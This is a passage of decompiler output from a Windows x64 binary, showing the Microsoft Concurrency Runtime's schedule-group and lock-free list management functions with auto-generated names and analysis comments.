  v7 = *(_QWORD **)(a1 + 32);
  while ( v7 )
  {
    v8 = v7 - 2;
    v7 = (_QWORD *)*v7;
    sub_13F14088C(v8, 48i64);
  }
  v9 = *(_QWORD **)(a1 + 88);
  if ( v9 )
  {
    do
    {
      v10 = 0;
      if ( *(int *)(a1 + 80) > 0 )
      {
        v11 = 0i64;
        do
        {
          sub_13F14088C(*(_QWORD *)(*v9 + v11), 48i64);
          ++v10;
          v11 += 8i64;
        }
        while ( v10 < *(_DWORD *)(a1 + 80) );
      }
      v12 = (_QWORD *)v9[1];
      sub_13F14088C(*v9, v4);
      sub_13F14088C(v9, 24i64);
      v9 = v12;
    }
    while ( v12 );
  }
  return sub_13F14088C(*(_QWORD *)(a1 + 96), v4);
}
// 13F158263: variable 'v4' is possibly undefined
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);

//----- (000000013F1582A0) ----------------------------------------------------
__int64 __fastcall sub_13F1582A0(__int64 a1)
{
  __int64 v2; // rdx
  _QWORD *v3; // rbx
  _QWORD *v4; // rsi
  __int64 v5; // rdx
  __int64 v6; // rdx
  __int64 v7; // rdx
  __int64 v8; // rdx
  _QWORD *v9; // rbx
  _QWORD *v10; // rsi
  __int64 v11; // rdx
  __int64 v12; // rdx
  __int64 v13; // rdx
  _QWORD *v14; // rbx
  _QWORD *v15; // rsi
  __int64 v16; // rdx
  __int64 v17; // rdx
  __int64 v18; // rdx
  _QWORD *v19; // rsi
  int v20; // ebx
  __int64 v21; // r14
  _QWORD *v22; // rbp
  __int64 v23; // rdx
  __int64 v24; // rdx
  __int64 v25; // rdx
  _QWORD *v26; // rbx

  v3 = (_QWORD *)MEMORY[0x771B51E0]();
  while ( v3 )
  {
    v4 = v3 - 6;
    v3 = (_QWORD *)*v3;
    if ( v4 )
    {
      sub_13F14088C(v4[26], v2);
      sub_13F14088C(v4[27], v5);
      sub_13F14088C(v4[2], v6);
      sub_13F14088C(v4[3], v7);
      sub_13F14088C(v4, 240i64);
    }
  }
  v9 = (_QWORD *)MEMORY[0x771B51E0](a1 + 16);
  while ( v9 )
  {
    v10 = v9 - 6;
    v9 = (_QWORD *)*v9;
    if ( v10 )
    {
      sub_13F14088C(v10[26], v8);
      sub_13F14088C(v10[27], v11);
      sub_13F14088C(v10[2], v12);
      sub_13F14088C(v10[3], v13);
      sub_13F14088C(v10, 240i64);
    }
  }
  v14 = *(_QWORD **)(a1 + 32);
  while ( v14 )
  {
    v15 = v14 - 6;
    v14 = (_QWORD *)*v14;
    if ( v15 )
    {
      sub_13F14088C(v15[26], v8);
      sub_13F14088C(v15[27], v16);
      sub_13F14088C(v15[2], v17);
      sub_13F14088C(v15[3], v18);
      sub_13F14088C(v15, 240i64);
    }
  }
  v19 = *(_QWORD **)(a1 + 88);
  if ( v19 )
  {
    do
    {
      v20 = 0;
      if ( *(int *)(a1 + 80) > 0 )
      {
        v21 = 0i64;
        do
        {
          v22 = *(_QWORD **)(v21 + *v19);
          if ( v22 )
          {
            sub_13F14088C(v22[26], v8);
            sub_13F14088C(v22[27], v23);
            sub_13F14088C(v22[2], v24);
            sub_13F14088C(v22[3], v25);
            sub_13F14088C(v22, 240i64);
          }
          ++v20;
          v21 += 8i64;
        }
        while ( v20 < *(_DWORD *)(a1 + 80) );
      }
      v26 = (_QWORD *)v19[1];
      sub_13F14088C(*v19, v8);
      sub_13F14088C(v19, 24i64);
      v19 = v26;
    }
    while ( v26 );
  }
  return sub_13F14088C(*(_QWORD *)(a1 + 96), v8);
}
// 13F1582E2: variable 'v2' is possibly undefined
// 13F1582EE: variable 'v5' is possibly undefined
// 13F1582F7: variable 'v6' is possibly undefined
// 13F158300: variable 'v7' is possibly undefined
// 13F15833A: variable 'v8' is possibly undefined
// 13F158346: variable 'v11' is possibly undefined
// 13F15834F: variable 'v12' is possibly undefined
// 13F158358: variable 'v13' is possibly undefined
// 13F158392: variable 'v16' is possibly undefined
// 13F15839B: variable 'v17' is possibly undefined
// 13F1583A4: variable 'v18' is possibly undefined
// 13F1583EB: variable 'v23' is possibly undefined
// 13F1583F4: variable 'v24' is possibly undefined
// 13F1583FD: variable 'v25' is possibly undefined
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);

//----- (000000013F15845C) ----------------------------------------------------
__int64 __fastcall sub_13F15845C(__int64 a1, __int64 a2)
{
  __int64 v3; // r8
  __int64 v4; // rdi
  unsigned int v5; // ecx

  v3 = *(_QWORD *)(a1 + 40);
  if ( v3 )
  {
    do
    {
      v4 = *(_QWORD *)(v3 + 40);
      if ( v3 == *(_QWORD *)(a1 + 32) )
        v5 = *(_DWORD *)(a1 + 52) - *(_DWORD *)(v3 + 32);
      else
        v5 = *(_DWORD *)(a1 + 24);
      if ( !(v5 + _InterlockedExchangeAdd((volatile signed __int32 *)(v3 + 36), v5)) )
        sub_13F14AA74(
          (__int64 (__fastcall **)(__int64))(v3 + 48),
          (__int64 (__fastcall *)(__int64))sub_13F14EF30,
          (__int64 (__fastcall *)(__int64))v3,
          *(_QWORD *)v3);
      v3 = v4;
    }
    while ( v4 );
  }
  return sub_13F14088C(*(_QWORD *)(a1 + 16), a2);
}
// 13F1584CB: variable 'a2' is possibly undefined
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);

//----- (000000013F1584D0) ----------------------------------------------------
__int64 __fastcall sub_13F1584D0(signed __int64 a1)
{
  __int64 v2; // rdx
  __int64 v3; // r8
  __int64 v4; // rdx
  __int64 v5; // rdx

  *(_QWORD *)a1 = &Concurrency::details::ScheduleGroupSegmentBase::`vftable';
  if ( (*(_DWORD *)(a1 + 24) & 0xFFFFFFF) == 3 )
  {
    v2 = (unsigned int)(16 * *(_DWORD *)(a1 + 64));
    v3 = *(_QWORD *)(*(_QWORD *)(a1 + 424) + 8i64);
    if ( *(_QWORD *)(*(_QWORD *)(v3 + 160) + 8 * v2) == a1 )
      _InterlockedCompareExchange64((volatile signed __int64 *)(*(_QWORD *)(v3 + 160) + 8 * v2), 0i64, a1);
  }
  sub_13F1581AC(a1 + 288);
  sub_13F1582A0(a1 + 160);
  sub_13F15845C(a1 + 96, v4);
  return sub_13F14088C(*(_QWORD *)(a1 + 56), v5);
}
// 13F158540: variable 'v4' is possibly undefined
// 13F15854E: variable 'v5' is possibly undefined
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);
// 13F18BE60: using guessed type void *Concurrency::details::ScheduleGroupSegmentBase::`vftable';

//----- (000000013F158554) ----------------------------------------------------
signed __int64 __fastcall sub_13F158554(signed __int64 a1, char a2)
{
  sub_13F1584D0(a1);
  if ( (a2 & 1) != 0 )
    sub_13F14088C(a1, 496i64);
  return a1;
}
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);

//----- (000000013F158588) ----------------------------------------------------
__int64 __fastcall sub_13F158588(__int64 a1, _DWORD *a2)
{
  __int64 v2; // rbx
  unsigned int v3; // esi
  char v4; // bp
  _QWORD *v7; // r9
  signed __int32 v8; // edx
  _QWORD *v9; // r8
  int v10; // er10
  int v11; // er11
  unsigned __int64 v12; // rcx
  unsigned __int128 v13; // rax
  __int64 v14; // r14
  __int64 v15; // rax
  __int64 v16; // rdx
  char v18[8]; // [rsp+20h] [rbp-48h] BYREF
  int v19; // [rsp+28h] [rbp-40h]
  __int64 (__fastcall *v20)(); // [rsp+30h] [rbp-38h]

  v2 = *(_QWORD *)(a1 + 88);
  v3 = 0;
  v4 = 0;
  do
  {
    if ( *(int *)(v2 + 16) >= -1 )
    {
      v7 = *(_QWORD **)v2;
      v8 = 0;
      if ( *(int *)(a1 + 80) > 0 )
      {
        v9 = *(_QWORD **)v2;
        while ( 1 )
        {
          if ( !*v9 )
          {
            v10 = v8 + v3;
            *a2 = v8 + v3;
            v11 = *(_DWORD *)(a1 + 112);
            if ( !_InterlockedCompareExchange64(&v7[v8], (signed __int64)a2, 0i64) )
              break;
          }
          ++v8;
          ++v9;
          if ( v8 >= *(_DWORD *)(a1 + 80) )
            goto LABEL_12;
        }
        v4 = 1;
        v3 += v8;
        if ( v10 >= v11 )
          _InterlockedAdd((volatile signed __int32 *)(a1 + 112), 1u);
        _InterlockedCompareExchange((volatile signed __int32 *)(v2 + 16), -1, v8);
      }
    }
LABEL_12:
    if ( !v4 )
    {
      _InterlockedCompareExchange((volatile signed __int32 *)(v2 + 16), -2, -1);
      v3 += *(_DWORD *)(a1 + 80);
      if ( !*(_QWORD *)(v2 + 8) && !_InterlockedCompareExchange64((volatile signed __int64 *)(v2 + 8), 1i64, 0i64) )
      {
        v12 = *(int *)(a1 + 80);
        v13 = v12 * (unsigned __int128)8ui64;
        if ( !is_mul_ok(v12, 8ui64) )
          *(_QWORD *)&v13 = -1i64;
        v14 = sub_13F1790C4(v13, *((_QWORD *)&v13 + 1));
        sub_13F15EF70(v14, 0, 8i64 * *(int *)(a1 + 80));
        v15 = sub_13F14059C(24i64);
        v16 = v15;
        if ( v15 )
        {
          *(_QWORD *)(v15 + 8) = 0i64;
          *(_QWORD *)v15 = v14;
          *(_DWORD *)(v15 + 16) = -1;
        }
        else
        {
          v16 = 0i64;
        }
        if ( *(_DWORD *)(a1 + 108) < *(_DWORD *)(a1 + 104) )
          *(_QWORD *)(*(_QWORD *)(a1 + 96) + 8i64 * (int)(*(_DWORD *)(a1 + 108))++) = v16;
        _InterlockedExchange64((volatile __int64 *)(v2 + 8), v16);
      }
      if ( *(_QWORD *)(v2 + 8) == 1i64 )
      {
        v19 = 0;
        v20 = sub_13F142C6C;
        do
          sub_13F141BF4((__int64)v18);
        while ( *(_QWORD *)(v2 + 8) == 1i64 );
      }
    }
    v2 = *(_QWORD *)(v2 + 8);
  }
  while ( !v4 );
  return v3;
}
// 13F142C6C: using guessed type __int64 __fastcall sub_13F142C6C();
// 13F1790C4: using guessed type __int64 __fastcall sub_13F1790C4(_QWORD, _QWORD);
// 13F158588: using guessed type char var_48[8];

//----- (000000013F158704) ----------------------------------------------------
__int64 __fastcall sub_13F158704(__int64 a1, signed __int64 a2)
{
  __int64 v2; // rbx
  unsigned int v3; // esi
  char v4; // bp
  _QWORD *v7; // r9
  signed __int32 v8; // edx
  _QWORD *v9; // r8
  int v10; // er10
  int v11; // er11
  unsigned __int64 v12; // rcx
  unsigned __int128 v13; // rax
  __int64 v14; // r14
  __int64 v15; // rax
  __int64 v16; // rdx
  char v18[8]; // [rsp+20h] [rbp-48h] BYREF
  int v19; // [rsp+28h] [rbp-40h]
  __int64 (__fastcall *v20)(); // [rsp+30h] [rbp-38h]

  v2 = *(_QWORD *)(a1 + 88);
  v3 = 0;
  v4 = 0;
  do
  {
    if ( *(int *)(v2 + 16) >= -1 )
    {
      v7 = *(_QWORD **)v2;
      v8 = 0;
      if ( *(int *)(a1 + 80) > 0 )
      {
        v9 = *(_QWORD **)v2;
        while ( 1 )
        {
          if ( !*v9 )
          {
            v10 = v8 + v3;
            *(_DWORD *)(a2 + 416) = v8 + v3;
            v11 = *(_DWORD *)(a1 + 112);
            if ( !_InterlockedCompareExchange64(&v7[v8], a2, 0i64) )
              break;
          }
          ++v8;
          ++v9;
          if ( v8 >= *(_DWORD *)(a1 + 80) )
            goto LABEL_12;
        }
        v4 = 1;
        v3 += v8;
        if ( v10 >= v11 )
          _InterlockedAdd((volatile signed __int32 *)(a1 + 112), 1u);
        _InterlockedCompareExchange((volatile signed __int32 *)(v2 + 16), -1, v8);
      }
    }
LABEL_12:
    if ( !v4 )
    {
      _InterlockedCompareExchange((volatile signed __int32 *)(v2 + 16), -2, -1);
      v3 += *(_DWORD *)(a1 + 80);
      if ( !*(_QWORD *)(v2 + 8) && !_InterlockedCompareExchange64((volatile signed __int64 *)(v2 + 8), 1i64, 0i64) )
      {
        v12 = *(int *)(a1 + 80);
        v13 = v12 * (unsigned __int128)8ui64;
        if ( !is_mul_ok(v12, 8ui64) )
          *(_QWORD *)&v13 = -1i64;
        v14 = sub_13F1790C4(v13, *((_QWORD *)&v13 + 1));
        sub_13F15EF70(v14, 0, 8i64 * *(int *)(a1 + 80));
        v15 = sub_13F14059C(24i64);
        v16 = v15;
        if ( v15 )
        {
          *(_QWORD *)(v15 + 8) = 0i64;
          *(_QWORD *)v15 = v14;
          *(_DWORD *)(v15 + 16) = -1;
        }
        else
        {
          v16 = 0i64;
        }
        if ( *(_DWORD *)(a1 + 108) < *(_DWORD *)(a1 + 104) )
          *(_QWORD *)(*(_QWORD *)(a1 + 96) + 8i64 * (int)(*(_DWORD *)(a1 + 108))++) = v16;
        _InterlockedExchange64((volatile __int64 *)(v2 + 8), v16);
      }
      if ( *(_QWORD *)(v2 + 8) == 1i64 )
      {
        v19 = 0;
        v20 = sub_13F142C6C;
        do
          sub_13F141BF4((__int64)v18);
        while ( *(_QWORD *)(v2 + 8) == 1i64 );
      }
    }
    v2 = *(_QWORD *)(v2 + 8);
  }
  while ( !v4 );
  return v3;
}
// 13F142C6C: using guessed type __int64 __fastcall sub_13F142C6C();
// 13F1790C4: using guessed type __int64 __fastcall sub_13F1790C4(_QWORD, _QWORD);
// 13F158704: using guessed type char var_48[8];

//----- (000000013F158884) ----------------------------------------------------
char __fastcall sub_13F158884(_QWORD *a1, __int64 a2, __int64 a3)
{
  __int64 v6; // rax
  __int64 v7; // r14
  __int64 v8; // rax
  __int64 (__fastcall *v9)(__int64, __int64, int *); // rax
  int v10; // eax
  int v11; // er9
  int v12; // edx
  __int64 v13; // rax
  int v15[2]; // [rsp+20h] [rbp-50h] BYREF
  __int64 v16; // [rsp+28h] [rbp-48h]
  __int64 v17; // [rsp+30h] [rbp-40h]
  int v18[2]; // [rsp+38h] [rbp-38h] BYREF
  __int64 v19; // [rsp+40h] [rbp-30h]
  __int64 v20; // [rsp+48h] [rbp-28h]
  int v21; // [rsp+50h] [rbp-20h]
  int v22; // [rsp+54h] [rbp-1Ch]
  __int64 v23; // [rsp+58h] [rbp-18h]
  __int64 v24; // [rsp+60h] [rbp-10h]

  v6 = sub_13F1492D4();
  if ( !v6 || (_QWORD *)sub_13F102FD0(v6) != a1 )
    *(_DWORD *)(a2 + 352) = 1;
  v7 = *(_QWORD *)(a1[53] + 8i64);
  if ( *(int *)(v7 + 680) <= 0
    || (v8 = *(_QWORD *)v7,
        v15[0] = *(_DWORD *)a3,
        v16 = *(_QWORD *)(a3 + 8),
        v9 = *(__int64 (__fastcall **)(__int64, __int64, int *))(v8 + 120),
        v15[1] = *(_DWORD *)(a3 + 4),
        v17 = *(_QWORD *)(a3 + 16),
        LOBYTE(v10) = v9(v7, a2, v15),
        !(_BYTE)v10) )
  {
    (*(void (__fastcall **)(_QWORD *, __int64))(*a1 + 16i64))(a1, a2);
    if ( (a1[3] & 0xFFFFFFF) != 0 && (*(_DWORD *)a3 & 0xFFFFFFF) == (a1[3] & 0xFFFFFFF) && *(_QWORD *)(a3 + 8) == a1[4] )
      (*(void (__fastcall **)(_QWORD *))(*a1 + 8i64))(a1);
    v10 = *(_DWORD *)(v7 + 676);
    if ( v10 > 0 )
    {
      v11 = *(_DWORD *)a3;
      v12 = *(_DWORD *)(a3 + 4);
      v13 = *(_QWORD *)(a3 + 16);
      v23 = *(_QWORD *)(a3 + 8);
      v19 = v23;
      v21 = v11;
      v22 = v12;
      v18[0] = v11;
      v18[1] = v12;
      v24 = v13;
      v20 = v13;
      LOBYTE(v10) = sub_13F14BD04(v7, (__int64)a1, (__int64)v18, 11);
    }
  }
  *(_DWORD *)(a2 + 352) = 0;
  return v10;
}
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);

//----- (000000013F1589C0) ----------------------------------------------------
char __fastcall sub_13F1589C0(__int64 a1)
{
  char result; // al
  _QWORD *v3; // rsi
  _QWORD *v4; // rcx

  result = sub_13F14A2E4(*(_QWORD *)(a1 + 72));
  if ( !result )
  {
    v3 = *(_QWORD **)(a1 + 32);
    while ( v3 )
    {
      v4 = v3 - 2;
      v3 = (_QWORD *)*v3;
      result = sub_13F14088C(v4, 48i64);
    }
    *(_QWORD *)(a1 + 32) = 0i64;
    _InterlockedExchange((volatile __int32 *)(a1 + 120), 0);
  }
  return result;
}
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);

//----- (000000013F158A14) ----------------------------------------------------
signed __int64 __fastcall sub_13F158A14(__int64 a1, _DWORD *a2, __int64 a3)
{
  __int64 v4; // rcx
  unsigned __int64 v7; // rsi
  __int64 v8; // rax
  signed __int64 v9; // rbx

  v4 = a3 + 160;
  v7 = -(__int64)((*a2 & 0xFFFFFFF) != 0) & 0xFFFFFFFFFFFFFFF8ui64;
  if ( (*a2 & 0xFFFFFFF) != 0 )
    v4 = a3 + 32;
  v8 = MEMORY[0x771DAED0](v4);
  if ( !v8 || (v9 = v8 - 480, v8 == 480) )
    v9 = (*(__int64 (__fastcall **)(__int64, __int64, _DWORD *))(*(_QWORD *)a1 + 64i64))(a1, a3, a2);
  else
    sub_13F158FC0(v8 - 480, a1, a3, (__int64)a2);
  *(_QWORD *)(v9 + 432) = *(_QWORD *)(v7 + a1 + 32);
  *(_QWORD *)(v7 + a1 + 32) = v9;
  if ( !*(_DWORD *)(a3 + 300) )
    sub_13F157CDC(a3);
  sub_13F158704(a3 + 160 + (-(__int64)((*a2 & 0xFFFFFFF) != 0) & 0xFFFFFFFFFFFFFF80ui64), v9);
  return v9;
}
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);

//----- (000000013F158B04) ----------------------------------------------------
__int64 __fastcall sub_13F158B04(__int64 a1)
{
  __int64 v2; // rax
  __int64 result; // rax
  char v4[8]; // [rsp+38h] [rbp-20h] BYREF
  int v5; // [rsp+40h] [rbp-18h]
  __int64 (__fastcall *v6)(); // [rsp+48h] [rbp-10h]

  if ( !*(_QWORD *)(a1 + 32) && !_InterlockedCompareExchange64((volatile signed __int64 *)(a1 + 32), 1i64, 0i64) )
  {
    v2 = sub_13F14059C(80i64);
    if ( v2 )
      v2 = sub_13F158124(v2, *(_QWORD *)a1, (int *)(a1 + 8), *(_DWORD *)(a1 + 24), 0);
    *(_QWORD *)(a1 + 32) = v2;
    *(_QWORD *)(a1 + 40) = v2;
  }
  result = *(_QWORD *)(a1 + 40);
  if ( !result )
  {
    v5 = 0;
    v6 = sub_13F142C2C;
    while ( 1 )
    {
      result = *(_QWORD *)(a1 + 40);
      if ( result )
        break;
      sub_13F141BF4((__int64)v4);
    }
  }
  return result;
}
// 13F142C2C: using guessed type __int64 __fastcall sub_13F142C2C();
// 13F158B04: using guessed type char var_20[8];

//----- (000000013F158B94) ----------------------------------------------------
char __fastcall sub_13F158B94(__int64 a1, _QWORD *a2)
{
  unsigned __int32 i; // ebp
  signed __int32 v5; // eax
  __int64 v6; // r14
  signed __int64 v7; // rbx
  signed __int64 j; // rsi
  bool v9; // zf
  signed __int64 v10; // rax
  unsigned int v11; // ecx
  __int64 v13; // [rsp+20h] [rbp-28h] BYREF
  unsigned __int32 v14; // [rsp+28h] [rbp-20h]

LABEL_1:
  for ( i = *(_DWORD *)(a1 + 48); i != *(_DWORD *)(a1 + 52); i = v5 )
  {
    v5 = _InterlockedCompareExchange((volatile signed __int32 *)(a1 + 48), i + 1, i);
    if ( i == v5 )
    {
      v6 = sub_13F1590E0(a1, i, 0);
      if ( v6 != *(_QWORD *)(a1 + 40) )
      {
        v7 = *(_QWORD *)(a1 + 40);
        while ( 1 )
        {
          for ( j = v7; !(*(_DWORD *)(a1 + 24) + *(_DWORD *)(j + 36)); j = *(_QWORD *)(j + 40) )
            ;
          if ( *(_DWORD *)(j + 32) <= *(_DWORD *)(v7 + 32) )
            break;
          v10 = _InterlockedCompareExchange64((volatile signed __int64 *)(a1 + 40), j, v7);
          v9 = v7 == v10;
          v7 = v10;
          if ( v9 )
          {
            while ( v7 != j )
            {
              v11 = *(_DWORD *)(a1 + 24);
              if ( !(v11 + _InterlockedExchangeAdd((volatile signed __int32 *)(v7 + 36), v11)) )
                sub_13F14AA74(
                  (__int64 (__fastcall **)(__int64))(v7 + 48),
                  (__int64 (__fastcall *)(__int64))sub_13F14EF30,
                  (__int64 (__fastcall *)(__int64))v7,
                  *(_QWORD *)v7);
              v7 = *(_QWORD *)(v7 + 40);
            }
            break;
          }
        }
      }
      v14 = i - *(_DWORD *)(v6 + 32);
      v13 = v6;
      if ( sub_13F14E40C((unsigned int *)&v13, a2) )
        return 1;
      goto LABEL_1;
    }
  }
  return 0;
}

//----- (000000013F158C84) ----------------------------------------------------
__int64 __fastcall sub_13F158C84(__int64 a1, __int64 a2)
{
  __int64 v4; // rax
  volatile __int32 *v5; // rbx

  v4 = *(_QWORD *)(a1 + 424);
  if ( (*(_BYTE *)(v4 + 80) & 4) == 0 )
    _InterlockedAdd((volatile signed __int32 *)(v4 + 40), 1u);
  v5 = *(volatile __int32 **)(a2 + 192);
  sub_13F142BD8(v5);
  *(_BYTE *)(a2 + 200) = 1;
  *(_DWORD *)(a2 + 204) = *(_DWORD *)(a2 + 180);
  sub_13F142C20(v5);
  _InterlockedExchange((volatile __int32 *)(a2 + 144), 1);
  return sub_13F158588(a1 + 288, (_DWORD *)(a2 + 96));
}

//----- (000000013F158D14) ----------------------------------------------------
__int64 __fastcall sub_13F158D14(__int64 a1, __int64 a2, __int64 a3)
{
  __int64 v5; // rbx
  char v7[40]; // [rsp+20h] [rbp-28h] BYREF

  v5 = *(_QWORD *)((-(__int64)((*(_DWORD *)a2 & 0xFFFFFFF) != 0) & 0xFFFFFFFFFFFFFFF8ui64) + a1 + 32);
  sub_13F155B0C(*(int **)(a3 + 8), (__int64)v7);
  while ( v5
       && (((*(_DWORD *)a2 ^ *(_DWORD *)(v5 + 24)) & 0xFFFFFFF) != 0
        || *(_QWORD *)(v5 + 32) != *(_QWORD *)(a2 + 8)
        || *(_QWORD *)(v5 + 16) != a3) )
    v5 = *(_QWORD *)(v5 + 432);
  return v5;
}
// 13F158D14: using guessed type char var_28[40];

//----- (000000013F158D8C) ----------------------------------------------------
__int64 __fastcall sub_13F158D8C(__int64 a1)
{
  int v1; // er14
  int v3; // esi
  int v4; // edx
  __int64 v5; // rcx
  __int64 v6; // r8
  int v7; // edx
  _QWORD *v8; // r8
  __int64 v9; // rcx
  signed __int64 v10; // rbp
  __int64 v12; // rsi
  signed __int64 v13; // rbx

  v1 = *(_DWORD *)(a1 + 400);
  v3 = 0;
  if ( v1 <= 0 )
    return 0i64;
  while ( 1 )
  {
    v4 = v3 >> *(_DWORD *)(a1 + 372);
    if ( v4 < *(_DWORD *)(a1 + 396) )
    {
      v5 = *(int *)(a1 + 392);
      v6 = *(_QWORD *)(a1 + 384);
      if ( v4 < (int)v5 )
      {
        v8 = *(_QWORD **)(v6 + 8i64 * v4);
      }
      else
      {
        v7 = v4 - v5;
        v8 = *(_QWORD **)(v6 + 8 * v5 - 8);
        if ( v7 >= 0 )
        {
          v9 = (unsigned int)(v7 + 1);
          do
          {
            v8 = (_QWORD *)v8[1];
            --v9;
          }
          while ( v9 );
        }
      }
      v10 = *(_QWORD *)(*v8 + 8 * (v3 & (unsigned __int64)(*(int *)(a1 + 368) - 1i64)));
      if ( v10 )
      {
        if ( sub_13F15944C(a1 + 288, v10, v3, 0) )
          break;
      }
    }
    if ( ++v3 >= v1 )
      return 0i64;
  }
  v12 = *(_QWORD *)(v10 + 32);
  _InterlockedExchange((volatile __int32 *)(v12 + 144), 0);
  v13 = *(_QWORD *)(a1 + 424);
  if ( (*(_BYTE *)(v13 + 80) & 4) == 0
    && _InterlockedExchangeAdd((volatile signed __int32 *)(v13 + 40), 0xFFFFFFFF) == 1 )
  {
    (*(void (__fastcall **)(signed __int64))(*(_QWORD *)v13 + 56i64))(v13);
    sub_13F14B92C(*(_QWORD *)(v13 + 8), v13);
  }
  return v12;
}
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);

//----- (000000013F158E98) ----------------------------------------------------
__int64 __fastcall sub_13F158E98(__int64 a1, __int64 a2, char a3)
{
  __int64 v6; // rax
  __int64 v7; // rbx

  v6 = sub_13F149D3C(*(_QWORD *)(*(_QWORD *)(a1 + 424) + 8i64), 1);
  v7 = v6;
  if ( v6 )
    sub_13F156F18(v6, a1, a2, a3);
  return v7;
}

//----- (000000013F158EF8) ----------------------------------------------------
__int64 __fastcall sub_13F158EF8(__int64 a1)
{
  __int64 *v1; // rdi
  __int64 v2; // rsi
  __int64 v4; // rcx
  __int64 v5; // rax

  v1 = (__int64 *)(a1 + 72);
  v2 = 0i64;
  if ( !*(_QWORD *)(a1 + 72) )
    return 0i64;
  sub_13F142BD8((volatile __int32 *)(a1 + 88));
  v4 = *v1;
  if ( *v1 )
  {
    v5 = *(_QWORD *)(v4 + 32);
    *v1 = v5;
    if ( !v5 )
      v1[1] = (__int64)v1;
    v2 = v4;
  }
  sub_13F142C20((_DWORD *)v1 + 4);
  return v2;
}

//----- (000000013F158F64) ----------------------------------------------------
bool __fastcall sub_13F158F64(__int64 a1)
{
  return *(_QWORD *)(a1 + 72) != 0i64;
}

//----- (000000013F158F70) ----------------------------------------------------
bool __fastcall sub_13F158F70(__int64 a1)
{
  return sub_13F159318(a1) != 0;
}

//----- (000000013F158F84) ----------------------------------------------------
__int64 __fastcall sub_13F158F84(__int64 a1, __int64 a2)
{
  __int64 result; // rax

  *(_DWORD *)(a1 + 40) = 1;
  *(_DWORD *)(a1 + 56) ^= (*(_DWORD *)a2 ^ *(_DWORD *)(a1 + 56)) & 0xFFFFFFF;
  *(_DWORD *)(a1 + 56) = *(_DWORD *)a2 ^ (*(_DWORD *)(a1 + 56) ^ *(_DWORD *)a2) & 0xFFFFFFF;
  *(_QWORD *)(a1 + 64) = *(_QWORD *)(a2 + 8);
  *(_DWORD *)(a1 + 60) = *(_DWORD *)(a2 + 4);
  result = *(_QWORD *)(a2 + 16);
  *(_QWORD *)(a1 + 72) = result;
  return result;
}

//----- (000000013F158FC0) ----------------------------------------------------
__int64 __fastcall sub_13F158FC0(__int64 a1, __int64 a2, __int64 a3, __int64 a4)
{
  __int64 v7; // rbx
  __int64 v8; // rdx
  __int64 v9; // rdx
  int *v10; // rcx
  __int64 result; // rax
  char v12[8]; // [rsp+20h] [rbp-28h] BYREF
  __int64 v13; // [rsp+28h] [rbp-20h]
  int v14; // [rsp+50h] [rbp+8h] BYREF
  int v15; // [rsp+58h] [rbp+10h] BYREF

  *(_QWORD *)(a1 + 424) = a2;
  *(_QWORD *)(a1 + 16) = a3;
  *(_DWORD *)(a1 + 24) ^= (*(_DWORD *)a4 ^ *(_DWORD *)(a1 + 24)) & 0xFFFFFFF;
  *(_DWORD *)(a1 + 24) = *(_DWORD *)a4 ^ (*(_DWORD *)(a1 + 24) ^ *(_DWORD *)a4) & 0xFFFFFFF;
  *(_QWORD *)(a1 + 32) = *(_QWORD *)(a4 + 8);
  *(_DWORD *)(a1 + 28) = *(_DWORD *)(a4 + 4);
  *(_QWORD *)(a1 + 40) = *(_QWORD *)(a4 + 16);
  *(_DWORD *)(a1 + 448) = 0;
  *(_DWORD *)(a1 + 472) = 1;
  v7 = sub_13F149ADC(*(_QWORD *)(a2 + 8), (__int64)v12, (_DWORD *)a4);
  sub_13F14088C(*(_QWORD *)(a1 + 56), v8);
  *(_DWORD *)(a1 + 48) = *(_DWORD *)v7;
  *(_QWORD *)(a1 + 56) = *(_QWORD *)(v7 + 8);
  *(_DWORD *)v7 = 0;
  *(_QWORD *)(v7 + 8) = 0i64;
  sub_13F14088C(v13, v9);
  if ( (*(_DWORD *)a4 & 0xFFFFFFF) == 3 )
  {
    v10 = (int *)(*(_QWORD *)(a2 + 8) + 584i64);
    v14 = *(_DWORD *)(a4 + 8);
    sub_13F149520(v10, &v14, &v15);
    *(_DWORD *)(a1 + 64) = v15;
  }
  sub_13F149020((int *)(a1 + 104), (int *)(a1 + 48));
  result = *(_QWORD *)(a1 + 136);
  if ( result )
    return sub_13F149020((int *)(*(_QWORD *)(a1 + 136) + 8i64), (int *)(a1 + 48));
  return result;
}
// 13F159049: variable 'v8' is possibly undefined
// 13F159067: variable 'v9' is possibly undefined
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);
// 13F158FC0: using guessed type char var_28[8];

//----- (000000013F1590E0) ----------------------------------------------------
__int64 __fastcall sub_13F1590E0(__int64 a1, unsigned int a2, char a3)
{
  __int64 v6; // rcx
  _DWORD *v7; // rsi
  __int64 *v8; // rdi
  __int64 v9; // rax

  if ( !*(_QWORD *)(a1 + 40) )
    sub_13F158B04(a1);
  if ( a3 )
    v6 = *(_QWORD *)(a1 + 32);
  else
    v6 = *(_QWORD *)(a1 + 40);
  while ( 1 )
  {
    v7 = (_DWORD *)(v6 + 32);
    if ( a2 < *(_DWORD *)(a1 + 24) + *(_DWORD *)(v6 + 32) )
      break;
    v8 = (__int64 *)(v6 + 40);
    v6 = *(_QWORD *)(v6 + 40);
    if ( !v6 )
    {
      v9 = sub_13F14059C(80i64);
      v6 = v9 ? sub_13F158124(v9, *(_QWORD *)a1, (int *)(a1 + 8), *(_DWORD *)(a1 + 24), *(_DWORD *)(a1 + 24) + *v7) : 0i64;
      *(_QWORD *)(a1 + 32) = v6;
      *v8 = v6;
      if ( !v6 )
        break;
    }
  }
  return v6;
}

//----- (000000013F159198) ----------------------------------------------------
signed __int64 __fastcall sub_13F159198(__int64 a1, int *a2, char a3)
{
  __int64 v6; // rax
  __int64 v7; // rdi
  __int64 v8; // r15
  int *i; // rdx
  __int64 v10; // rax
  int *v11; // rax
  signed __int64 result; // rax
